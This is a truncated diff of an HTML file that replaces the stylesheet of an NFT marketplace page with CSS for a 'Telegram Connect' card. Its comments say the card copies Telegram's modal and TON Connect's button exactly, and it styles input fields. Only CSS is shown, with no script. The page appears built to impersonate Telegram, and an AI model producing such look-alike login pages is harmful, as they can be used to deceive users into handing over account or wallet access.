@@ -1,1990 +1,357 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-    <title>Fragment — NFT Marketplace</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Connect</title>
+    <!-- Шрифт как в Telegram (Inter) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
     <style>
-        /* ============================================================
-           RESET & BASE
-           ============================================================ */
+        /* ГЛОБАЛЬНЫЙ СБРОС И БАЗА */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
-
         body {
-            background: #0b0b12;
-            color: #e8e8f0;
-            font-family: 'Inter', -apple-system, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a; /* тёмный фон, как в Telegram */
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            -webkit-font-smoothing: antialiased;
-            overflow-x: hidden;
-            padding-bottom: 80px;
+            margin: 0;
+            padding: 16px;
+            color: #ffffff;
         }
 
-        ::-webkit-scrollbar {
-            width: 4px;
-            height: 4px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #14141f;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #6e4bff;
-            border-radius: 10px;
-        }
-
-        /* ============================================================
-           HEADER
-           ============================================================ */
-        .header {
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            background: rgba(11, 11, 18, 0.95);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            padding: 0 16px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .header-logo {
-            font-size: 18px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #6e4bff, #9b7cff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            cursor: pointer;
-        }
-
-        .header-logo small {
-            font-size: 10px;
-            font-weight: 600;
-            color: #6e4bff;
-            -webkit-text-fill-color: #6e4bff;
-            background: rgba(110, 75, 255, 0.12);
-            padding: 2px 8px;
-            border-radius: 12px;
-            margin-left: 6px;
-        }
-
-        .header-close {
-            color: #808099;
-            font-size: 20px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .header-close span {
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .header-close:hover {
-            color: #e8e8f0;
-        }
-
-        /* ============================================================
-           TOP BANNER
-           ============================================================ */
-        .top-banner {
-            background: linear-gradient(135deg, rgba(110, 75, 255, 0.08), rgba(155, 124, 255, 0.04));
-            border: 1px solid rgba(110, 75, 255, 0.08);
-            border-radius: 14px;
-            padding: 14px 18px;
-            margin: 12px 16px 0;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .top-banner .title {
-            font-size: 14px;
-            font-weight: 600;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .top-banner .title i {
-            color: #6e4bff;
-        }
-
-        .top-banner .sub {
-            font-size: 12px;
-            color: #808099;
-        }
-
-        .top-banner .btn-banner {
-            background: linear-gradient(135deg, #6e4bff, #8b6cff);
-            border: none;
-            border-radius: 10px;
-            padding: 6px 16px;
-            color: #fff;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .top-banner .btn-banner:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 20px rgba(110, 75, 255, 0.3);
-        }
-
-        /* ============================================================
-           TABS
-           ============================================================ */
-        .tabs {
-            display: flex;
-            gap: 4px;
-            padding: 12px 16px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            overflow-x: auto;
-            flex-wrap: nowrap;
-        }
-
-        .tabs::-webkit-scrollbar {
-            height: 0;
-        }
-
-        .tab {
-            padding: 8px 16px;
-            font-size: 13px;
-            font-weight: 500;
-            color: #808099;
-            cursor: pointer;
-            border-radius: 10px 10px 0 0;
-            transition: all 0.2s;
-            white-space: nowrap;
-            position: relative;
-            user-select: none;
-        }
-
-        .tab:hover {
-            color: #e8e8f0;
-            background: rgba(255, 255, 255, 0.03);
-        }
-
-        .tab.active {
-            color: #fff;
-            background: rgba(110, 75, 255, 0.08);
-        }
-
-        .tab.active::after {
-            content: '';
-            position: absolute;
-            bottom: -1px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 24px;
-            height: 2px;
-            background: #6e4bff;
-            border-radius: 10px;
-        }
-
-        /* ============================================================
-           SEARCH BAR
-           ============================================================ */
-        .search-bar {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 10px 16px;
-            background: rgba(255, 255, 255, 0.03);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            flex-wrap: wrap;
-        }
-
-        .search-bar input {
-            flex: 1;
-            min-width: 120px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 10px;
-            padding: 8px 14px;
-            font-size: 13px;
-            color: #e8e8f0;
-            font-family: 'Inter', sans-serif;
-            outline: none;
-            transition: all 0.2s;
-        }
-
-        .search-bar input::placeholder {
-            color: #4a4a62;
-        }
-
-        .search-bar input:focus {
-            border-color: rgba(110, 75, 255, 0.3);
-        }
-
-        .search-bar .filter-group {
-            display: flex;
-            gap: 4px;
-            flex-wrap: wrap;
-        }
-
-        .search-bar .filter-btn {
-            padding: 6px 14px;
-            font-size: 12px;
-            font-weight: 500;
-            color: #808099;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: 'Inter', sans-serif;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .search-bar .filter-btn:hover {
-            background: rgba(255, 255, 255, 0.08);
-            color: #e8e8f0;
-        }
-
-        .search-bar .filter-btn.active {
-            background: rgba(110, 75, 255, 0.12);
-            border-color: rgba(110, 75, 255, 0.2);
-            color: #6e4bff;
-        }
-
-        .search-bar .filter-btn i {
-            font-size: 10px;
-        }
-
-        /* ============================================================
-           STATS BAR
-           ============================================================ */
-        .stats-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 16px;
-            font-size: 13px;
-            color: #5a5a72;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-        }
-
-        .stats-bar .left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .stats-bar .left span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .stats-bar .left .num {
-            color: #e8e8f0;
-            font-weight: 600;
-        }
-
-        /* ============================================================
-           NFT GRID
-           ============================================================ */
-        .nft-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-            gap: 12px;
-            padding: 12px 16px;
-        }
-
-        .nft-card {
-            background: #14141f;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 14px;
-            padding: 14px;
-            transition: all 0.25s ease;
-            cursor: pointer;
-            position: relative;
-        }
-
-        .nft-card:hover {
-            border-color: rgba(110, 75, 255, 0.2);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .nft-card .name {
-            font-size: 14px;
-            font-weight: 600;
-            color: #fff;
-            margin-bottom: 2px;
-        }
-
-        .nft-card .sub {
-            font-size: 11px;
-            color: #5a5a72;
-            margin-bottom: 8px;
-        }
-
-        .nft-card .price-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 13px;
-            font-weight: 600;
-        }
-
-        .nft-card .price-row .price {
-            color: #6e4bff;
-        }
-
-        .nft-card .price-row .change {
-            font-size: 11px;
-            font-weight: 500;
-        }
-
-        .nft-card .price-row .change.up {
-            color: #44d4a0;
-        }
-
-        .nft-card .price-row .change.down {
-            color: #ff6b6b;
-        }
-
-        .nft-card .badge {
-            position: absolute;
-            top: 8px;
-            right: 8px;
-            font-size: 10px;
-            font-weight: 600;
-            color: #fff;
-            background: rgba(110, 75, 255, 0.2);
-            padding: 2px 8px;
-            border-radius: 10px;
-            border: 1px solid rgba(110, 75, 255, 0.1);
-        }
-
-        /* ============================================================
-           FILTERS PANEL (как на скринах)
-           ============================================================ */
-        .filters-panel {
-            background: #14141f;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 14px;
-            margin: 0 16px 12px;
-            padding: 16px 18px;
-            display: none;
-        }
-
-        .filters-panel.open {
-            display: block;
-        }
-
-        .filters-panel .filter-section {
-            margin-bottom: 14px;
-        }
-
-        .filters-panel .filter-section:last-child {
-            margin-bottom: 0;
-        }
-
-        .filters-panel .filter-section .label {
-            font-size: 12px;
-            font-weight: 500;
-            color: #5a5a72;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            margin-bottom: 6px;
-            display: block;
-        }
-
-        .filters-panel .filter-section .options {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 6px;
-        }
-
-        .filters-panel .filter-section .options .opt {
-            padding: 4px 12px;
-            font-size: 12px;
-            font-weight: 500;
-            color: #808099;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .filters-panel .filter-section .options .opt:hover {
-            background: rgba(255, 255, 255, 0.08);
-        }
-
-        .filters-panel .filter-section .options .opt.active {
-            background: rgba(110, 75, 255, 0.12);
-            border-color: rgba(110, 75, 255, 0.2);
-            color: #6e4bff;
-        }
-
-        .filters-panel .filter-actions {
-            display: flex;
-            gap: 8px;
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .filters-panel .filter-actions button {
-            padding: 8px 20px;
-            border-radius: 10px;
-            font-size: 13px;
-            font-weight: 600;
-            border: none;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.2s;
-        }
-
-        .filters-panel .filter-actions .btn-clear {
-            background: rgba(255, 255, 255, 0.04);
-            color: #808099;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .filters-panel .filter-actions .btn-clear:hover {
-            background: rgba(255, 255, 255, 0.08);
-        }
-
-        .filters-panel .filter-actions .btn-apply {
-            background: linear-gradient(135deg, #6e4bff, #8b6cff);
-            color: #fff;
-            box-shadow: 0 2px 16px rgba(110, 75, 255, 0.2);
-            flex: 1;
-        }
-
-        .filters-panel .filter-actions .btn-apply:hover {
-            box-shadow: 0 4px 24px rgba(110, 75, 255, 0.3);
-        }
-
-        /* ============================================================
-           DETAIL CARD (как на скрине Precious Peach)
-           ============================================================ */
-        .detail-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
+        /* КАРТОЧКА — точь-в-точь как модалка Telegram */
+        .telegram-modal {
+            max-width: 420px;
             width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
-            z-index: 200;
-            display: none;
+            background: #1f1f1f; /* основной фон карточки */
+            border-radius: 32px;
+            padding: 24px 24px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #2b2b2b;
+            transition: all 0.2s ease;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* ШАПКА С ИКОНКОЙ И ЗАГОЛОВКОМ */
+        .modal-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        .modal-header .icon-wrapper {
+            width: 80px;
+            height: 80px;
+            background: #2b2b2b;
+            border-radius: 50%;
+            display: flex;
             align-items: center;
             justify-content: center;
-            padding: 16px;
-        }
-
-        .detail-overlay.open {
-            display: flex;
-        }
-
-        .detail-card {
-            background: #14141f;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 20px;
-            padding: 28px 30px;
-            max-width: 480px;
-            width: 100%;
+            margin-bottom: 16px;
             position: relative;
-            animation: slideUp 0.3s ease;
+        }
+        .modal-header .icon-wrapper img {
+            width: 48px;
+            height: 48px;
+            filter: brightness(1.1);
+        }
+        /* Имитация иконки Telegram (можно заменить на SVG) */
+        .modal-header .icon-wrapper .tg-icon {
+            font-size: 42px;
+            line-height: 1;
+            color: #ffffff;
+            font-weight: 600;
         }
 
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px) scale(0.96);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        .detail-card .close-btn {
-            position: absolute;
-            top: 12px;
-            right: 16px;
-            font-size: 20px;
-            color: #5a5a72;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-
-        .detail-card .close-btn:hover {
-            color: #e8e8f0;
-        }
-
-        .detail-card .nft-title {
+        .modal-header h2 {
             font-size: 22px;
             font-weight: 700;
-            color: #fff;
-        }
-
-        .detail-card .nft-id {
-            font-size: 13px;
-            color: #5a5a72;
-            margin-bottom: 12px;
-        }
-
-        .detail-card .attrs {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 8px;
-            margin: 12px 0 16px;
-        }
-
-        .detail-card .attrs .attr {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 10px;
-            padding: 8px 10px;
-        }
-
-        .detail-card .attrs .attr .label {
-            font-size: 10px;
-            font-weight: 500;
-            color: #5a5a72;
-            text-transform: uppercase;
-        }
-
-        .detail-card .attrs .attr .value {
-            font-size: 13px;
-            font-weight: 600;
-            color: #e8e8f0;
-            margin-top: 2px;
-        }
-
-        .detail-card .floors {
-            display: flex;
-            gap: 16px;
-            font-size: 13px;
-            color: #808099;
-            margin-bottom: 16px;
-            padding: 10px 0;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-        }
-
-        .detail-card .floors .floor span {
-            color: #e8e8f0;
-            font-weight: 600;
-        }
-
-        .detail-card .offer-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-top: 12px;
-        }
-
-        .detail-card .offer-row .offer-price {
-            font-size: 24px;
-            font-weight: 800;
-            color: #6e4bff;
-        }
-
-        .detail-card .offer-row .offer-label {
-            font-size: 13px;
-            color: #5a5a72;
-        }
-
-        .detail-card .btn-add {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #6e4bff, #8b6cff);
-            border: none;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: 'Inter', sans-serif;
-            margin-top: 12px;
-            box-shadow: 0 4px 24px rgba(110, 75, 255, 0.2);
-        }
-
-        .detail-card .btn-add:hover {
-            transform: scale(1.01);
-            box-shadow: 0 6px 32px rgba(110, 75, 255, 0.3);
-        }
-
-        /* ============================================================
-           ORDERS PAGE (как на скрине)
-           ============================================================ */
-        .orders-list {
-            padding: 12px 16px;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .order-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #14141f;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 12px;
-            padding: 12px 16px;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .order-item .info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .order-item .info .name {
-            font-weight: 600;
-            color: #fff;
-            font-size: 14px;
-        }
-
-        .order-item .info .qty {
-            font-size: 12px;
-            color: #5a5a72;
-        }
-
-        .order-item .price {
-            font-weight: 700;
-            color: #6e4bff;
-            font-size: 15px;
-        }
-
-        .order-item .actions {
-            display: flex;
-            gap: 6px;
-        }
-
-        .order-item .actions button {
-            padding: 4px 12px;
-            border-radius: 8px;
-            border: none;
-            font-size: 12px;
-            font-weight: 500;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.2s;
-        }
-
-        .order-item .actions .btn-detail {
-            background: rgba(255, 255, 255, 0.04);
-            color: #808099;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .order-item .actions .btn-detail:hover {
-            background: rgba(255, 255, 255, 0.08);
-        }
-
-        .order-item .actions .btn-sell {
-            background: rgba(110, 75, 255, 0.12);
-            color: #6e4bff;
-            border: 1px solid rgba(110, 75, 255, 0.1);
-        }
-
-        .order-item .actions .btn-sell:hover {
-            background: rgba(110, 75, 255, 0.2);
-        }
-
-        .create-order-btn {
-            margin: 12px 16px;
-            padding: 14px;
-            background: rgba(110, 75, 255, 0.08);
-            border: 1px dashed rgba(110, 75, 255, 0.2);
-            border-radius: 14px;
-            color: #6e4bff;
-            font-weight: 600;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: 'Inter', sans-serif;
-            font-size: 14px;
-        }
-
-        .create-order-btn:hover {
-            background: rgba(110, 75, 255, 0.14);
-        }
-
-        /* ============================================================
-           TASKS / HUB (как на скрине PlayHub)
-           ============================================================ */
-        .hub-header {
-            padding: 12px 16px;
-            background: linear-gradient(135deg, rgba(110, 75, 255, 0.06), rgba(155, 124, 255, 0.02));
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            margin-bottom: 8px;
-        }
-
-        .hub-header .title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        .hub-header .sub {
-            font-size: 13px;
-            color: #808099;
-            margin-top: 2px;
-        }
-
-        .hub-header .prize {
-            font-size: 14px;
-            font-weight: 600;
-            color: #6e4bff;
-            margin-top: 4px;
-        }
-
-        .hub-tabs {
-            display: flex;
-            gap: 16px;
-            padding: 8px 16px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            font-size: 13px;
-            font-weight: 500;
-            color: #808099;
-        }
-
-        .hub-tabs .htab {
-            cursor: pointer;
-            padding: 4px 0;
-            position: relative;
-            transition: color 0.2s;
-        }
-
-        .hub-tabs .htab:hover {
-            color: #e8e8f0;
-        }
-
-        .hub-tabs .htab.active {
-            color: #fff;
-        }
-
-        .hub-tabs .htab.active::after {
-            content: '';
-            position: absolute;
-            bottom: -4px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: #6e4bff;
-            border-radius: 10px;
-        }
-
-        .task-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 16px;
-            background: rgba(255, 255, 255, 0.02);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .task-item .desc {
-            font-size: 14px;
-            font-weight: 500;
-            color: #e8e8f0;
-        }
-
-        .task-item .progress {
-            font-size: 12px;
-            color: #5a5a72;
-        }
-
-        .task-item .task-actions {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .task-item .task-actions .reward {
-            font-size: 13px;
-            font-weight: 600;
-            color: #6e4bff;
-        }
-
-        .task-item .task-actions .timer {
-            font-size: 12px;
-            color: #5a5a72;
-            font-family: monospace;
-        }
-
-        .task-item .task-actions .btn-start {
-            padding: 4px 16px;
-            border-radius: 8px;
-            border: none;
-            background: linear-gradient(135deg, #6e4bff, #8b6cff);
-            color: #fff;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.2s;
-        }
-
-        .task-item .task-actions .btn-start:hover {
-            transform: scale(1.02);
-        }
-
-        .task-item .task-actions .btn-start:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
-
-        /* ============================================================
-           BOTTOM NAV (как на скринах)
-           ============================================================ */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(11, 11, 18, 0.96);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            display: flex;
-            justify-content: space-around;
-            padding: 6px 0 env(safe-area-inset-bottom, 8px);
-            z-index: 150;
-        }
-
-        .bottom-nav .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 2px;
-            font-size: 10px;
-            font-weight: 500;
-            color: #5a5a72;
-            cursor: pointer;
-            transition: all 0.2s;
-            padding: 4px 12px;
-            border: none;
-            background: none;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .bottom-nav .nav-item i {
-            font-size: 20px;
-        }
-
-        .bottom-nav .nav-item:hover {
-            color: #808099;
-        }
-
-        .bottom-nav .nav-item.active {
-            color: #6e4bff;
-        }
-
-        .bottom-nav .nav-item .badge {
-            background: #ff6b6b;
-            color: #fff;
-            font-size: 9px;
-            font-weight: 700;
-            padding: 1px 6px;
-            border-radius: 10px;
-            position: absolute;
-            top: -2px;
-            right: -4px;
-        }
-
-        .bottom-nav .nav-item {
-            position: relative;
-        }
-
-        /* ============================================================
-           GIFT / STARS (как на скринах)
-           ============================================================ */
-        .gift-section {
-            padding: 16px;
-        }
-
-        .gift-section .gift-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 4px;
-        }
-
-        .gift-section .gift-sub {
-            font-size: 13px;
-            color: #808099;
-            margin-bottom: 16px;
-        }
-
-        .gift-section .gift-options {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 16px;
-            flex-wrap: wrap;
-        }
-
-        .gift-section .gift-options .gopt {
-            padding: 8px 16px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: 500;
-            font-size: 13px;
-            color: #808099;
-            transition: all 0.2s;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .gift-section .gift-options .gopt:hover {
-            background: rgba(255, 255, 255, 0.08);
-        }
-
-        .gift-section .gift-options .gopt.active {
-            background: rgba(110, 75, 255, 0.12);
-            border-color: rgba(110, 75, 255, 0.2);
-            color: #6e4bff;
-        }
-
-        .gift-section .gift-receiver {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 12px;
-            flex-wrap: wrap;
-        }
-
-        .gift-section .gift-receiver input {
-            flex: 1;
-            min-width: 140px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 10px;
-            padding: 10px 14px;
-            font-size: 13px;
-            color: #e8e8f0;
-            font-family: 'Inter', sans-serif;
-            outline: none;
-        }
-
-        .gift-section .gift-receiver input::placeholder {
-            color: #4a4a62;
-        }
-
-        .gift-section .gift-receiver .btn-self {
-            padding: 10px 16px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 10px;
-            color: #808099;
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            white-space: nowrap;
-        }
-
-        .gift-section .gift-receiver .btn-self:hover {
-            background: rgba(255, 255, 255, 0.08);
-        }
-
-        .gift-section .gift-fee {
-            font-size: 13px;
-            color: #5a5a72;
-            margin-bottom: 12px;
-        }
-
-        .gift-section .gift-fee .val {
-            color: #808099;
-        }
-
-        .gift-section .btn-buy {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #6e4bff, #8b6cff);
-            border: none;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.2s;
-            box-shadow: 0 4px 24px rgba(110, 75, 255, 0.2);
-        }
-
-        .gift-section .btn-buy:hover {
-            box-shadow: 0 6px 32px rgba(110, 75, 255, 0.3);
-        }
-
-        .gift-section .gift-agree {
-            font-size: 11px;
-            color: #4a4a62;
-            margin-top: 10px;
-        }
-
-        /* ============================================================
-           TOAST
-           ============================================================ */
-        .toast-container {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 9999;
-            background: #1a1a2e;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 14px;
-            padding: 12px 24px;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
-            display: none;
-            align-items: center;
-            gap: 12px;
-            max-width: 90%;
-            backdrop-filter: blur(12px);
-        }
-
-        .toast-container.show {
-            display: flex;
-        }
-
-        .toast-container .icon {
-            color: #6e4bff;
-        }
-
-        .toast-container .msg {
-            font-size: 14px;
-            font-weight: 500;
-            color: #e8e8f0;
-        }
-
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
-        @media (max-width: 600px) {
-            .nft-grid {
-                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-                gap: 8px;
-                padding: 8px 12px;
-            }
-
-            .nft-card {
-                padding: 10px;
-            }
-
-            .nft-card .name {
-                font-size: 12px;
-            }
-
-            .nft-card .price-row {
-                font-size: 12px;
-            }
-
-            .detail-card {
-                padding: 20px;
-                margin: 8px;
-            }
-
-            .detail-card .attrs {
-                grid-template-columns: 1fr 1fr;
-            }
-
-            .search-bar .filter-group .filter-btn {
-                font-size: 10px;
-                padding: 4px 10px;
-            }
-
-            .top-banner .sub {
-                display: none;
-            }
-
-            .header-logo {
-                font-size: 15px;
-            }
-
-            .tab {
-                font-size: 11px;
-                padding: 6px 12px;
-            }
-
-            .order-item {
-                flex-direction: column;
-                align-items: stretch;
-            }
-
-            .order-item .info {
-                justify-content: space-between;
-            }
-
-            .order-item .actions {
-                justify-content: flex-end;
-            }
-
-            .task-item {
-                flex-direction: column;
-                align-items: stretch;
-            }
-
-            .task-item .task-actions {
-                justify-content: flex-end;
-            }
-
-            .gift-section .gift-receiver {
-                flex-direction: column;
-            }
-
-            .gift-section .gift-receiver .btn-self {
-                text-align: center;
-            }
-        }
-
-        @media (max-width: 400px) {
-            .nft-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-
-        /* ============================================================
-           HIDDEN PAGES
-           ============================================================ */
-        .page {
-            display: none;
-        }
-
-        .page.active {
-            display: block;
-        }
-
-        .page-content {
-            padding-bottom: 20px;
-        }
-
-        /* ============================================================
-           COLLECTIONS GRID (как на скринах)
-           ============================================================ */
-        .collection-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-            gap: 12px;
-            padding: 12px 16px;
-        }
-
-        .collection-card {
-            background: #14141f;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 14px;
-            padding: 14px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .collection-card:hover {
-            border-color: rgba(110, 75, 255, 0.2);
-            transform: translateY(-2px);
-        }
-
-        .collection-card .icon {
-            font-size: 32px;
+            letter-spacing: -0.3px;
             margin-bottom: 6px;
+            color: #ffffff;
+        }
+        .modal-header p {
+            font-size: 15px;
+            color: #8e8e93;
+            text-align: center;
+            font-weight: 400;
+            max-width: 300px;
         }
 
-        .collection-card .name {
-            font-weight: 600;
-            color: #fff;
+        /* ПОЛЯ ВВОДА (стиль как у Telegram) */
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
             font-size: 14px;
+            font-weight: 500;
+            color: #8e8e93;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #2b2b2b;
+            border: 1.5px solid #3a3a3a;
+            border-radius: 16px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 400;
+            transition: border 0.2s, box-shadow 0.2s;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+        }
+        .input-group input:focus {
+            border-color: #3390ec;
+            box-shadow: 0 0 0 3px rgba(51, 144, 236, 0.2);
+        }
+        .input-group input::placeholder {
+            color: #5e5e63;
+            font-weight: 400;
         }
 
-        .collection-card .count {
+        /* КНОПКА ПОДКЛЮЧИТЬ (как в TON Connect) */
+        .connect-btn {
+            width: 100%;
+            padding: 16px;
+            background: #3390ec;
+            border: none;
+            border-radius: 16px;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            margin-top: 8px;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 12px rgba(51, 144, 236, 0.3);
+        }
+        .connect-btn:hover {
+            background: #2a7bc7;
+        }
+        .connect-btn:active {
+            transform: scale(0.97);
+            background: #1f6ab3;
+        }
+
+        /* ДОПОЛНИТЕЛЬНАЯ ИНФОРМАЦИЯ (как в Telegram) */
+        .footer-note {
+            text-align: center;
+            font-size: 13px;
+            color: #5e5e63;
+            margin-top: 20px;
+            line-height: 1.5;
+            border-top: 1px solid #2b2b2b;
+            padding-top: 18px;
+        }
+        .footer-note a {
